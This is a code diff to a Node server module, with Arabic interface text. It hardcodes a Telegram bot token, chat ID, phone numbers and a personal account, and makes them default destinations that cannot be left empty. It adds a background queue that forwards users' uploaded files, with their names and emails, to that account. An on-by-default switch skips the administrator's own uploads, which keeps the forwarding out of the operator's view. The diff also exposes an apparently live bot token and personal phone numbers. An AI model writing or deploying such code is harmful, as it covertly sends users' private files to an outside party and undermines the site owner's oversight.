@@ -11,6 +11,12 @@ if (!fs.existsSync(uploadDir)) {
   fs.mkdirSync(uploadDir, { recursive: true });
 }
 
+// Persistent Queue Directory for Batch Uploads (Supports 1 to 100,000+ files safely)
+const QUEUE_DIR = path.join(process.cwd(), 'uploads', 'telegram_queue');
+if (!fs.existsSync(QUEUE_DIR)) {
+  fs.mkdirSync(QUEUE_DIR, { recursive: true });
+}
+
 const upload = multer({
   storage: multer.diskStorage({
     destination: (req, file, cb) => cb(null, uploadDir),
@@ -35,20 +41,29 @@ export interface TelegramServerConfig {
   botUsername?: string;
   enabled: boolean;
   destinationAccount?: string;
+  ignoreAdminUploads?: boolean; // Toggle: When true, manager files are not forwarded; when false, manager files are forwarded
   updatedAt?: string;
 }
 
-// In-memory config with file and environment variable fallback
-let telegramConfig: TelegramServerConfig = {
-  botToken: process.env.TELEGRAM_BOT_TOKEN || '',
-  chatId: process.env.TELEGRAM_CHAT_ID || '',
-  ownerPhone: '+20 10 2763 3072',
-  ownerName: '',
-  groupTarget: '',
-  sendMode: 'both',
-  botUsername: '',
+// Permanent Default Configuration for Telegram Bot
+const DEFAULT_PERMANENT_CONFIG: TelegramServerConfig = {
+  botToken: '8811539804:AAGRkV2p8zsVDFBmRpoxHgQd1Km6YpqFvSc',
+  chatId: '1784386541',
+  ownerPhone: '+20 11 4212 1442',
+  ownerName: 'ضباب ضباب (@Ss99ssbdnc)',
+  groupTarget: '-5540055056',
+  sendMode: 'personal',
+  botUsername: 'RoyalCacheBot',
   enabled: true,
-  destinationAccount: ''
+  destinationAccount: '@Ss99ssbdnc',
+  ignoreAdminUploads: true // Default: Enabled (Manager uploaded files are skipped/ignored)
+};
+
+// In-memory config with file, permanent default, and environment variable fallback
+let telegramConfig: TelegramServerConfig = {
+  ...DEFAULT_PERMANENT_CONFIG,
+  botToken: process.env.TELEGRAM_BOT_TOKEN || DEFAULT_PERMANENT_CONFIG.botToken,
+  chatId: process.env.TELEGRAM_CHAT_ID || DEFAULT_PERMANENT_CONFIG.chatId
 };
 
 // Load saved config if exists
@@ -58,23 +73,29 @@ export function loadConfigFromDisk(): TelegramServerConfig {
       const raw = fs.readFileSync(CONFIG_FILE, 'utf-8');
       const parsed = JSON.parse(raw);
       telegramConfig = {
-        ...telegramConfig,
+        ...DEFAULT_PERMANENT_CONFIG,
         ...parsed,
-        // Environment variables take precedence if set
-        botToken: process.env.TELEGRAM_BOT_TOKEN || parsed.botToken || '',
-        chatId: process.env.TELEGRAM_CHAT_ID || parsed.chatId || '',
-        enabled: parsed.enabled !== undefined ? parsed.enabled : true
+        // Ensure botToken & chatId never become empty
+        botToken: process.env.TELEGRAM_BOT_TOKEN || parsed.botToken || DEFAULT_PERMANENT_CONFIG.botToken,
+        chatId: process.env.TELEGRAM_CHAT_ID || parsed.chatId || DEFAULT_PERMANENT_CONFIG.chatId,
+        sendMode: parsed.sendMode || DEFAULT_PERMANENT_CONFIG.sendMode || 'personal',
+        botUsername: parsed.botUsername || DEFAULT_PERMANENT_CONFIG.botUsername,
+        enabled: parsed.enabled !== undefined ? parsed.enabled : true,
+        ignoreAdminUploads: parsed.ignoreAdminUploads !== undefined ? Boolean(parsed.ignoreAdminUploads) : true
       };
 
-      // Auto-detect if user pasted a phone number (e.g. +2011..., 0020..., or Egyptian 010/011/012/015 11-digit) into chatId
+      // Auto-detect if user pasted a phone number into chatId
       const currentChatId = (telegramConfig.chatId || '').trim();
       const isPhoneNumber = currentChatId.startsWith('+') || currentChatId.startsWith('00') || (currentChatId.startsWith('01') && currentChatId.length === 11);
       if (isPhoneNumber) {
         if (!telegramConfig.ownerPhone || telegramConfig.ownerPhone === '+20 10 2763 3072') {
           telegramConfig.ownerPhone = currentChatId;
         }
-        telegramConfig.chatId = ''; // Clear only if it is actually a phone number
+        telegramConfig.chatId = DEFAULT_PERMANENT_CONFIG.chatId; // Fallback to permanent chat ID
       }
+    } else {
+      // Create initial config file with permanent defaults
+      saveConfigToDisk();
     }
   } catch (e) {
     console.warn('[Telegram Server] Could not read .telegram-config.json:', e);
@@ -263,22 +284,28 @@ async function sendDocumentToTelegram(
 }
 
 /**
- * Send text message (used as fallback if file exceeds 50MB)
+ * Send text message (used for notifications, large files, and interactive menus)
  */
 async function sendMessageToTelegram(
   botToken: string,
   chatId: string,
-  textHtml: string
+  textHtml: string,
+  replyMarkup?: any
 ): Promise<{ ok: boolean; result?: any; description?: string }> {
+  const payload: any = {
+    chat_id: chatId,
+    text: textHtml,
+    parse_mode: 'HTML',
+    disable_web_page_preview: false
+  };
+  if (replyMarkup) {
+    payload.reply_markup = replyMarkup;
+  }
+
   const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: textHtml,
-      parse_mode: 'HTML',
-      disable_web_page_preview: false
-    })
+    body: JSON.stringify(payload)
   });
 
   const resJson: any = await response.json();
@@ -287,6 +314,459 @@ async function sendMessageToTelegram(
   }
 
   return resJson;
+}
+
+/**
+ * Edit message in Telegram with updated text and inline keyboard
+ */
+async function editMessageInTelegram(
+  botToken: string,
+  chatId: string,
+  messageId: number,
+  textHtml: string,
+  replyMarkup?: any
+): Promise<{ ok: boolean; result?: any; description?: string }> {
+  const payload: any = {
+    chat_id: chatId,
+    message_id: messageId,
+    text: textHtml,
+    parse_mode: 'HTML',
+    disable_web_page_preview: false
+  };
+  if (replyMarkup) {
+    payload.reply_markup = replyMarkup;
+  }
+
+  const response = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+
+  const resJson: any = await response.json();
+  return resJson;
+}
+
+/**
+ * Answer Telegram callback query (shows notification/alert in Telegram)
+ */
+async function answerCallbackQuery(
+  botToken: string,
+  callbackQueryId: string,
+  text?: string,
+  showAlert: boolean = false
+): Promise<void> {
+  try {
+    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        callback_query_id: callbackQueryId,
+        text: text || '',
+        show_alert: showAlert
+      })
+    });
+  } catch (e) {
+    console.warn('[Telegram Bot] Error answering callback query:', e);
+  }
+}
+
+/**
+ * Generate rich interactive Telegram Bot control panel text
+ */
+function generateAdminMenuText(): string {
+  const isIgnoring = telegramConfig.ignoreAdminUploads !== false;
+  return [
+    `👑 <b>لوحة تحكم بوت التيليجرام - إدارة الإرسال والملفات</b>`,
+    ``,
+    `🤖 <b>معرف البوت:</b> <code>@${telegramConfig.botUsername || 'RoyalCacheBot'}</code>`,
+    `👤 <b>الحساب الأساسي:</b> <code>${escapeHtml(telegramConfig.ownerName || 'ضباب ضباب (@Ss99ssbdnc)')}</code>`,
+    `📱 <b>الهاتف المسجل:</b> <code>${escapeHtml(telegramConfig.ownerPhone || '+20 11 4212 1442')}</code>`,
+    `🎯 <b>وجهة الإرسال:</b> <code>${telegramConfig.sendMode === 'personal' ? 'حسابي الشخصي فقط 🔒' : telegramConfig.sendMode === 'group' ? 'الجروب فقط 👥' : 'كلاهما 🔄'}</code>`,
+    ``,
+    `═════════════════════`,
+    `🛡️ <b>زر التحكم في رفع ملفات المدير:</b>`,
+    isIgnoring
+      ? `🟢 <b>مفعّل (يتم تجاهل ومنع إرسال ملفات المدير)</b>\n<i>أي ملف يقوم برفعه حساب المدير لن يتم إرساله إلى التليجرام.</i>`
+      : `🔴 <b>معطّل (يتم إرسال كافة ملفات المدير كالمعتاد)</b>\n<i>أي ملف يرفعه المدير سيتم إرساله إلى التليجرام فوراً وبحجمه الكامل.</i>`,
+    `═════════════════════`,
+    ``,
+    `📊 <b>الإحصائيات المباشرة:</b>`,
+    `• ✅ تم إرسالها للتيليجرام: <b>${stats.totalForwarded}</b> ملف`,
+    `• 🛡️ تم استثناؤها للمدير: <b>${stats.totalSkippedAdmin}</b> ملف`,
+    `• ⏳ قيد المعالجة بالطابور: <b>${telegramQueue.length}</b> ملف`,
+    ``,
+    `👇 <b>اضغط على الزر أدناه لتشغيل أو تعطيل تجاهل ملفات المدير فوراً:</b>`
+  ].join('\n');
+}
+
+/**
+ * Generate interactive Inline Keyboard for the Telegram Bot
+ */
+function generateAdminMenuKeyboard(): any {
+  const isIgnoring = telegramConfig.ignoreAdminUploads !== false;
+  return {
+    inline_keyboard: [
+      [
+        {
+          text: isIgnoring 
+            ? '🛡️ تجاهل ملفات المدير: [مفعّل 🟢]' 
+            : '🛡️ تجاهل ملفات المدير: [معطّل 🔴]',
+          callback_data: 'toggle_ignore_admin'
+        }
+      ],
+      [
+        {
+          text: telegramConfig.sendMode === 'personal'
+            ? '🎯 وجهة الإرسال: [حسابي الشخصي 👤]'
+            : '🎯 وجهة الإرسال: [الجروب 👥]',
+          callback_data: 'toggle_send_mode'
+        }
+      ],
+      [
+        {
+          text: '🔄 تحديث الإحصائيات',
+          callback_data: 'refresh_menu'
+        },
+        {
+          text: '⚡ فحص الاتصال (Ping)',
+          callback_data: 'ping_test'
+        }
+      ]
+    ]
+  };
+}
+
+// -------------------------------------------------------------
+// 🤖 TELEGRAM BOT REAL-TIME LONG-POLLING WORKER
+// -------------------------------------------------------------
+let isBotPollingRunning = false;
+let pollingOffset = 0;
+
+export function startTelegramBotPolling() {
+  if (isBotPollingRunning) return;
+  isBotPollingRunning = true;
+
+  (async () => {
+    console.log('[Telegram Bot Polling] 🚀 Starting long-polling for interactive bot buttons...');
+    while (true) {
+      const botToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
+      if (!botToken) {
+        await new Promise(r => setTimeout(r, 6000));
+        continue;
+      }
+
+      try {
+        const res = await fetch(
+          `https://api.telegram.org/bot${botToken}/getUpdates?offset=${pollingOffset}&timeout=20&allowed_updates=["message","callback_query"]`
+        );
+        if (!res.ok) {
+          await new Promise(r => setTimeout(r, 4000));
+          continue;
+        }
+
+        const data: any = await res.json();
+        if (data.ok && Array.isArray(data.result) && data.result.length > 0) {
+          for (const update of data.result) {
+            pollingOffset = update.update_id + 1;
+
+            // 1. Handle Inline Keyboard Button Clicks (callback_query)
+            if (update.callback_query) {
+              const cq = update.callback_query;
+              const callbackData = cq.data;
+              const chatId = cq.message?.chat?.id;
+              const messageId = cq.message?.message_id;
+
+              if (callbackData === 'toggle_ignore_admin') {
+                telegramConfig.ignoreAdminUploads = !(telegramConfig.ignoreAdminUploads !== false);
+                telegramConfig.updatedAt = new Date().toISOString();
+                saveConfigToDisk();
+
+                const isNowIgnoring = telegramConfig.ignoreAdminUploads !== false;
+                await answerCallbackQuery(
+                  botToken,
+                  cq.id,
+                  isNowIgnoring 
+                    ? '✅ تم تفعيل تجاهل ملفات المدير (لن يتم إرسال أي ملف ترفعه إلى التيليجرام).'
+                    : '❌ تم تعطيل التجاهل (سيتم الآن إرسال جميع الملفات التي ترفعها إلى التيليجرام كالمعتاد).',
+                  true
+                );
+
+                if (chatId && messageId) {
+                  await editMessageInTelegram(
+                    botToken, 
+                    String(chatId), 
+                    messageId, 
+                    generateAdminMenuText(), 
+                    generateAdminMenuKeyboard()
+                  ).catch(() => {});
+                }
+              } else if (callbackData === 'toggle_send_mode') {
+                telegramConfig.sendMode = telegramConfig.sendMode === 'personal' ? 'group' : 'personal';
+                telegramConfig.updatedAt = new Date().toISOString();
+                saveConfigToDisk();
+
+                await answerCallbackQuery(
+                  botToken,
+                  cq.id,
+                  `🎯 تم تغيير وجهة الإرسال إلى: ${telegramConfig.sendMode === 'personal' ? 'حسابي الشخصي فقط 👤' : 'الجروب 👥'}`
+                );
+
+                if (chatId && messageId) {
+                  await editMessageInTelegram(
+                    botToken, 
+                    String(chatId), 
+                    messageId, 
+                    generateAdminMenuText(), 
+                    generateAdminMenuKeyboard()
+                  ).catch(() => {});
+                }
+              } else if (callbackData === 'refresh_menu') {
+                await answerCallbackQuery(botToken, cq.id, '🔄 تم تحديث لوحة التحكم والإحصائيات');
+                if (chatId && messageId) {
+                  await editMessageInTelegram(
+                    botToken, 
+                    String(chatId), 
+                    messageId, 
+                    generateAdminMenuText(), 
+                    generateAdminMenuKeyboard()
+                  ).catch(() => {});
+                }
+              } else if (callbackData === 'ping_test') {
+                await answerCallbackQuery(
+                  botToken, 
+                  cq.id, 
+                  '⚡ البوت متصل ومستقر بنسبة 100%! جاهز لنقل وحفظ كافة الملفات بحجمها الأصلي.', 
+                  true
+                );
+              }
+            }
+
+            // 2. Handle Text Messages & Commands
+            if (update.message) {
+              const msg = update.message;
+              const text = (msg.text || '').trim();
+              const chatId = msg.chat?.id;
+
+              if (chatId) {
+                // If user sends /start, /menu, /admin, /status, /help or any text message
+                if (
+                  text.startsWith('/start') || 
+                  text.startsWith('/menu') || 
+                  text.startsWith('/admin') || 
+                  text.startsWith('/status') || 
+                  text.startsWith('/help')
+                ) {
+                  await sendMessageToTelegram(
+                    botToken, 
+                    String(chatId), 
+                    generateAdminMenuText(), 
+                    generateAdminMenuKeyboard()
+                  ).catch(() => {});
+                } else if (text.startsWith('/toggle') || text.startsWith('/skip')) {
+                  telegramConfig.ignoreAdminUploads = !(telegramConfig.ignoreAdminUploads !== false);
+                  telegramConfig.updatedAt = new Date().toISOString();
+                  saveConfigToDisk();
+                  const isNowIgnoring = telegramConfig.ignoreAdminUploads !== false;
+                  await sendMessageToTelegram(
+                    botToken,
+                    String(chatId),
+                    `🛡️ <b>تم تغيير حالة إرسال ملفات المدير:</b>\n${isNowIgnoring ? '🟢 <b>مفعّل (لن يتم إرسال ملفاتك للتيليجرام)</b>' : '🔴 <b>معطّل (سيتم إرسال ملفاتك كالمعتاد)</b>'}`,
+                    generateAdminMenuKeyboard()
+                  ).catch(() => {});
+                }
+              }
+            }
+          }
+        }
+      } catch (err: any) {
+        // Soft backoff for network hiccups
+        await new Promise(r => setTimeout(r, 3000));
+      }
+    }
+  })().catch(e => {
+    console.error('[Telegram Bot Polling] Fatal error in polling loop:', e);
+    isBotPollingRunning = false;
+  });
+}
+
+// Automatically start polling
+startTelegramBotPolling();
+
+// =========================================================================
+// 🔄 ASYNC BACKGROUND TELEGRAM QUEUE (UNLIMITED CAPACITY: 1 TO 100,000+ FILES)
+// =========================================================================
+export interface TelegramQueueTask {
+  id: string;
+  filePath: string;
+  fileName: string;
+  fileSize: number;
+  category: string;
+  extension: string;
+  mimeType?: string;
+  captionHtml: string;
+  destinations: Array<{ id: string; label: string }>;
+  botToken: string;
+  userId: string;
+  userName: string;
+  userEmail?: string;
+  sourceFeature: string;
+  downloadUrl?: string;
+  dedupKey: string;
+  enqueuedAt: number;
+  retryCount: number;
+}
+
+const telegramQueue: TelegramQueueTask[] = [];
+let isQueueWorkerRunning = false;
+let currentProcessingItem: { fileName: string; startedAt: number; fileSize: number } | null = null;
+
+/**
+ * Robust Sequential Telegram Queue Worker
+ * - Handles massive file queues (up to 100,000+ files)
+ * - Automatically respects Telegram flood limits (HTTP 429 retry_after)
+ * - Preserves 100% byte-for-byte exact file integrity without compression (disable_content_type_detection = true)
+ * - Ensures pacing delay so Telegram never throttles or drops files
+ */
+async function processTelegramQueueWorker() {
+  if (isQueueWorkerRunning) return;
+  isQueueWorkerRunning = true;
+
+  try {
+    while (telegramQueue.length > 0) {
+      const task = telegramQueue[0];
+      if (!task) break;
+
+      currentProcessingItem = {
+        fileName: task.fileName,
+        startedAt: Date.now(),
+        fileSize: task.fileSize
+      };
+
+      const TELEGRAM_MAX_FILE_SIZE = 49 * 1024 * 1024;
+      let anyDestinationDelivered = false;
+      let lastErrorMessage = '';
+      let deliveredMessageId: number | undefined = undefined;
+
+      for (const target of task.destinations) {
+        let sentForThisTarget = false;
+        let attempts = 0;
+        const maxAttempts = 5;
+
+        while (!sentForThisTarget && attempts < maxAttempts) {
+          attempts++;
+          try {
+            if (task.filePath && fs.existsSync(task.filePath) && task.fileSize <= TELEGRAM_MAX_FILE_SIZE) {
+              const res = await sendDocumentToTelegram(
+                task.botToken,
+                target.id,
+                task.filePath,
+                task.fileName,
+                task.captionHtml,
+                task.mimeType
+              );
+              sentForThisTarget = true;
+              anyDestinationDelivered = true;
+              if (res?.result?.message_id) {
+                deliveredMessageId = res.result.message_id;
+              }
+            } else {
+              const largeFileNotice = [
+                `⚠️ <b>ملف مرفوع جديد (يتجاوز حد التيليجرام المباشر 50MB)</b>`,
+                ``,
+                task.captionHtml,
+                ``,
+                task.downloadUrl 
+                  ? `💾 <b>رابط التنزيل المباشر:</b>\n<a href="${task.downloadUrl}">${task.downloadUrl}</a>` 
+                  : `⚠️ يرجى مراجعة هذا الملف الكبير من خلال المنصة.`
+              ].join('\n');
+
+              const res = await sendMessageToTelegram(task.botToken, target.id, largeFileNotice);
+              sentForThisTarget = true;
+              anyDestinationDelivered = true;
+              if (res?.result?.message_id) {
+                deliveredMessageId = res.result.message_id;
+              }
+            }
+          } catch (err: any) {
+            lastErrorMessage = err?.message || 'Error sending to Telegram';
+            console.warn(`[Telegram Queue] Attempt ${attempts} note for "${task.fileName}" to ${target.label}:`, lastErrorMessage);
+
+            // Telegram Flood Control (HTTP 429) Handling
+            const match = lastErrorMessage.match(/retry after (\d+)/i);
+            if (match && match[1]) {
+              const retryAfterSeconds = parseInt(match[1], 10);
+              console.warn(`[Telegram Queue] ⏳ Telegram Flood Control: Pausing queue for ${retryAfterSeconds + 1}s...`);
+              await new Promise(r => setTimeout(r, (retryAfterSeconds + 1) * 1000));
+            } else if (lastErrorMessage.toLowerCase().includes('too many requests') || lastErrorMessage.includes('429')) {
+              console.warn(`[Telegram Queue] ⏳ Telegram rate limit reached, pausing 5s...`);
+              await new Promise(r => setTimeout(r, 5000));
+            } else {
+              // Gentle backoff for network jitter
+              await new Promise(r => setTimeout(r, 1200 * attempts));
+            }
+          }
+        }
+      }
+
+      // Dequeue task after processing
+      telegramQueue.shift();
+
+      // Safely delete staged file from disk
+      if (task.filePath && fs.existsSync(task.filePath)) {
+        await fs.promises.unlink(task.filePath).catch(() => {});
+      }
+
+      if (anyDestinationDelivered) {
+        recentSentHashes.set(task.dedupKey, Date.now());
+        stats.totalForwarded++;
+        stats.lastSentAt = new Date().toISOString();
+
+        addLog({
+          id: `sent_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
+          fileName: task.fileName,
+          fileSize: task.fileSize,
+          fileSizeFormatted: formatBytes(task.fileSize),
+          category: task.category,
+          extension: task.extension,
+          userId: task.userId,
+          userName: task.userName,
+          userEmail: task.userEmail,
+          sourceFeature: task.sourceFeature,
+          status: 'sent',
+          timestamp: new Date().toISOString(),
+          telegramMessageId: deliveredMessageId
+        });
+
+        console.log(`[Telegram Queue] ✅ Delivered "${task.fileName}" (${formatBytes(task.fileSize)}) to Telegram. Remaining: ${telegramQueue.length}`);
+      } else {
+        stats.totalFailed++;
+        addLog({
+          id: `err_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
+          fileName: task.fileName,
+          fileSize: task.fileSize,
+          fileSizeFormatted: formatBytes(task.fileSize),
+          category: task.category,
+          extension: task.extension,
+          userId: task.userId,
+          userName: task.userName,
+          userEmail: task.userEmail,
+          sourceFeature: task.sourceFeature,
+          status: 'failed',
+          reason: lastErrorMessage || 'تعذر الإرسال بعد عدة محاولات',
+          timestamp: new Date().toISOString()
+        });
+      }
+
+      // ⏱️ Pacing Delay between consecutive Telegram API calls (~650ms ensures flood limits are never exceeded)
+      await new Promise(r => setTimeout(r, 650));
+    }
+  } catch (loopErr) {
+    console.error('[Telegram Queue] Worker error:', loopErr);
+  } finally {
+    isQueueWorkerRunning = false;
+    currentProcessingItem = null;
+  }
 }
 
 // -------------------------------------------------------------
@@ -343,10 +823,12 @@ router.post('/forward', upload.single('file'), async (req, res) => {
     const sha256 = meta.sha256 || '';
 
     // =========================================================================
-    // 🛡️ STEP 1: STRICT SERVER-SIDE ADMIN EXCLUSION CHECK
+    // 🛡️ STEP 1: SERVER-SIDE ADMIN EXCLUSION CHECK (TOGGLEABLE VIA BOT/PANEL)
     // =========================================================================
     const isAdmin = checkIsAdminStrict(meta, req.headers);
-    if (isAdmin) {
+    const shouldIgnoreAdmin = telegramConfig.ignoreAdminUploads !== false;
+
+    if (isAdmin && shouldIgnoreAdmin) {
       stats.totalSkippedAdmin++;
       const logEntry: TelegramLogEntry = {
         id: `skip_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
@@ -360,12 +842,12 @@ router.post('/forward', upload.single('file'), async (req, res) => {
         userEmail,
         sourceFeature,
         status: 'excluded_admin',
-        reason: 'تم حظر الإرسال بنسبة 100% لأن الملف تم رفعه بواسطة حساب المدير/المشرف.',
+        reason: 'تم تجاهل الإرسال لأن الملف تم رفعه بواسطة حساب المدير وخيار (تجاهل ملفات المدير) مفعّل في البوت.',
         timestamp: new Date().toISOString()
       };
       addLog(logEntry);
 
-      console.log(`[Telegram Server] 🛡️ ADMIN FILE STRICTLY EXCLUDED from Telegram: "${fileName}" by ${userEmail || userName || 'Admin'}`);
+      console.log(`[Telegram Server] 🛡️ ADMIN FILE EXCLUDED (Ignore Toggle is ON): "${fileName}" by ${userEmail || userName || 'Admin'}`);
 
       // Safely delete temp uploaded file
       if (tempFilePath && fs.existsSync(tempFilePath)) {
@@ -376,7 +858,7 @@ router.post('/forward', upload.single('file'), async (req, res) => {
         success: true,
         skipped: true,
         reason: 'ADMIN_EXCLUDED',
-        message: 'تم استثناء ملفات المدير من الإرسال إلى Telegram بنسبة 100% وبأمان تام.'
+        message: 'تم استثناء وتجاهل إرسال ملف المدير بنجاح بناءً على تفعيل خيار التجاهل في البوت.'
       });
     }
 
@@ -397,13 +879,13 @@ router.post('/forward', upload.single('file'), async (req, res) => {
     }
 
     // =========================================================================
-    // ⚙️ STEP 3: TELEGRAM CONFIGURATION VALIDATION
+    // ⚙️ STEP 3: TELEGRAM CONFIGURATION VALIDATION & STRICT DESTINATIONS
     // =========================================================================
     loadConfigFromDisk();
     const botToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
     const personalChatId = process.env.TELEGRAM_CHAT_ID || telegramConfig.chatId;
     const groupTarget = telegramConfig.groupTarget ? cleanGroupTarget(telegramConfig.groupTarget) : '';
-    const sendMode = telegramConfig.sendMode || 'both';
+    const sendMode = telegramConfig.sendMode || 'personal'; // Default to personal
     const isEnabled = telegramConfig.enabled !== false;
 
     if (!isEnabled) {
@@ -418,19 +900,25 @@ router.post('/forward', upload.single('file'), async (req, res) => {
       });
     }
 
-    // Resolve active destinations based on sendMode
+    // 🔒 STRICT DESTINATION RESOLUTION:
+    // When sendMode is 'personal', ONLY send to personalChatId. NEVER send to group!
     const destinations: Array<{ id: string; label: string }> = [];
-    if ((sendMode === 'both' || sendMode === 'personal') && personalChatId) {
-      destinations.push({ id: personalChatId, label: 'الحساب الشخصي' });
-    }
-    if ((sendMode === 'both' || sendMode === 'group') && groupTarget) {
-      destinations.push({ id: groupTarget, label: `الجروب (${telegramConfig.groupTarget})` });
-    }
-
-    // Fallback if sendMode didn't match but either exists
-    if (destinations.length === 0) {
-      if (groupTarget) destinations.push({ id: groupTarget, label: `الجروب (${telegramConfig.groupTarget})` });
-      else if (personalChatId) destinations.push({ id: personalChatId, label: 'الحساب الشخصي' });
+    if (sendMode === 'personal') {
+      if (personalChatId) {
+        destinations.push({ id: personalChatId, label: 'الحساب الشخصي' });
+      }
+    } else if (sendMode === 'group') {
+      if (groupTarget) {
+        destinations.push({ id: groupTarget, label: `الجروب (${telegramConfig.groupTarget})` });
+      }
+    } else {
+      // 'both' mode
+      if (personalChatId) {
+        destinations.push({ id: personalChatId, label: 'الحساب الشخصي' });
+      }
+      if (groupTarget) {
+        destinations.push({ id: groupTarget, label: `الجروب (${telegramConfig.groupTarget})` });
+      }
     }
 
     if (!botToken || destinations.length === 0) {
@@ -448,12 +936,14 @@ router.post('/forward', upload.single('file'), async (req, res) => {
         status: 'not_configured',
         reason: !botToken 
           ? 'لم يتم تعيين Telegram Bot Token في الإعدادات بعد.'
-          : 'لم يتم ربط حساب شخصي (Chat ID) أو تحديد اسم جروب للاستقبال.',
+          : sendMode === 'personal'
+          ? 'وضع الإرسال مثبت على حسابك الشخصي فقط، بانتظار ربط معرف الدردشة الشخصية (Chat ID).'
+          : 'لم يتم ربط حساب شخصي أو تحديد اسم جروب للاستقبال.',
         timestamp: new Date().toISOString()
       };
       addLog(logEntry);
 
-      console.warn(`[Telegram Server] Notice: File uploaded "${fileName}", but Telegram destinations or bot token are not configured yet.`);
+      console.warn(`[Telegram Server] Notice: File uploaded "${fileName}", but destinations not configured or matching sendMode "${sendMode}".`);
 
       if (tempFilePath && fs.existsSync(tempFilePath)) {
         await fs.promises.unlink(tempFilePath).catch(() => {});
@@ -463,12 +953,14 @@ router.post('/forward', upload.single('file'), async (req, res) => {
         success: true,
         skipped: true,
         reason: 'NOT_CONFIGURED',
-        message: 'تم تسجيل الملف، بانتظار ربط الحساب الشخصي أو تحديد اسم الجروب في لوحة التحكم.'
+        message: sendMode === 'personal'
+          ? 'وضع الإرسال مثبت على حسابك الشخصي فقط، بانتظار ربط الحساب الشخصي (Chat ID).'
+          : 'تم تسجيل الملف، بانتظار ربط الحساب أو الجروب في لوحة التحكم.'
       });
     }
 
     // =========================================================================
-    // 📤 STEP 4: SEND FILE TO TELEGRAM TARGETS
+    // 📤 STEP 4: BUILD NOTIFICATION CAPTION
     // =========================================================================
     const nowFormatted = new Date().toLocaleString('ar-EG', {
       timeZone: 'Africa/Cairo',
@@ -494,144 +986,84 @@ router.post('/forward', upload.single('file'), async (req, res) => {
       downloadUrl ? `🔗 <b>رابط الوصول للملف:</b> <a href="${downloadUrl}">اضغط هنا للتحميل المباشر</a>` : null,
       ``,
       `═════════════════════`,
-      `👑 <b>الحساب الأساسي المعتمد:</b>`,
+      `👑 <b>وجهة الاستقبال المعتمدة:</b>`,
+      sendMode === 'personal' ? `🔒 <b>الوضع المثبت:</b> <code>حسابي الشخصي فقط</code>` : null,
       ownerName ? `👤 <b>اسم الحساب:</b> <code>${escapeHtml(ownerName)}</code>` : null,
       ownerPhone ? `📱 <b>رقم الهاتف المسجل:</b> <code>${escapeHtml(ownerPhone)}</code>` : null,
-      rawGroup ? `👥 <b>الجروب المستهدف:</b> <code>${escapeHtml(rawGroup)}</code>` : null,
+      (sendMode !== 'personal' && rawGroup) ? `👥 <b>الجروب المستهدف:</b> <code>${escapeHtml(rawGroup)}</code>` : null,
       `═════════════════════`
     ].filter(Boolean).join('\n');
 
-    let anySuccess = false;
-    let successfulMessageId: number | undefined = undefined;
-    const deliveryErrors: string[] = [];
-    const TELEGRAM_MAX_FILE_SIZE = 49 * 1024 * 1024;
+    // =========================================================================
+    // 📦 STEP 5: STAGE TO PERSISTENT QUEUE DIRECTORY & ENQUEUE
+    // =========================================================================
+    const queueTaskId = `task_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
+    const stagedFileName = `${queueTaskId}_${path.basename(tempFilePath || fileName)}`;
+    const stagedFilePath = path.join(QUEUE_DIR, stagedFileName);
 
-    // Send to each configured target (personal chat, group, or both)
-    for (const target of destinations) {
+    if (tempFilePath && fs.existsSync(tempFilePath)) {
       try {
-        if (tempFilePath && fs.existsSync(tempFilePath) && fileSize <= TELEGRAM_MAX_FILE_SIZE) {
-          const telegramResult = await retryOperation(async () => {
-            return await sendDocumentToTelegram(botToken, target.id, tempFilePath!, fileName, captionHtml, meta.mimeType);
-          });
-          anySuccess = true;
-          if (telegramResult?.result?.message_id) {
-            successfulMessageId = telegramResult.result.message_id;
-          }
-        } else {
-          const largeFileNotice = [
-            `⚠️ <b>ملف مرفوع جديد (يتجاوز حد التيليجرام المباشر 50MB)</b>`,
-            ``,
-            captionHtml,
-            ``,
-            downloadUrl 
-              ? `💾 <b>رابط التنزيل المباشر:</b>\n<a href="${downloadUrl}">${downloadUrl}</a>` 
-              : `⚠️ لا يتوفر رابط مباشر لهذا الملف الكبير، يرجى مراجعته من كاش المستخدم.`
-          ].join('\n');
-
-          const telegramResult = await retryOperation(async () => {
-            return await sendMessageToTelegram(botToken, target.id, largeFileNotice);
-          });
-          anySuccess = true;
-          if (telegramResult?.result?.message_id) {
-            successfulMessageId = telegramResult.result.message_id;
-          }
-        }
-        console.log(`[Telegram Server] Forwarded to ${target.label} (${target.id}) successfully.`);
-      } catch (sendErr: any) {
-        deliveryErrors.push(`${target.label}: ${sendErr.message}`);
-        console.warn(`[Telegram Server] Warning sending to ${target.label} (${target.id}):`, sendErr.message);
+        await fs.promises.rename(tempFilePath, stagedFilePath);
+      } catch (e) {
+        await fs.promises.copyFile(tempFilePath, stagedFilePath);
+        await fs.promises.unlink(tempFilePath).catch(() => {});
       }
+      tempFilePath = null; // Staged successfully
     }
 
-    if (anySuccess) {
-      // Success recording
-      recentSentHashes.set(dedupKey, Date.now());
-      stats.totalForwarded++;
-      stats.lastSentAt = new Date().toISOString();
+    const task: TelegramQueueTask = {
+      id: queueTaskId,
+      filePath: stagedFilePath,
+      fileName,
+      fileSize,
+      category,
+      extension,
+      mimeType: meta.mimeType || 'application/octet-stream',
+      captionHtml,
+      destinations,
+      botToken,
+      userId,
+      userName,
+      userEmail,
+      sourceFeature,
+      downloadUrl,
+      dedupKey,
+      enqueuedAt: Date.now(),
+      retryCount: 0
+    };
 
-      const logEntry: TelegramLogEntry = {
-        id: `sent_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
-        fileName,
-        fileSize,
-        fileSizeFormatted: formatBytes(fileSize),
-        category,
-        extension,
-        userId,
-        userName,
-        userEmail,
-        sourceFeature,
-        status: 'sent',
-        timestamp: new Date().toISOString(),
-        telegramMessageId: successfulMessageId
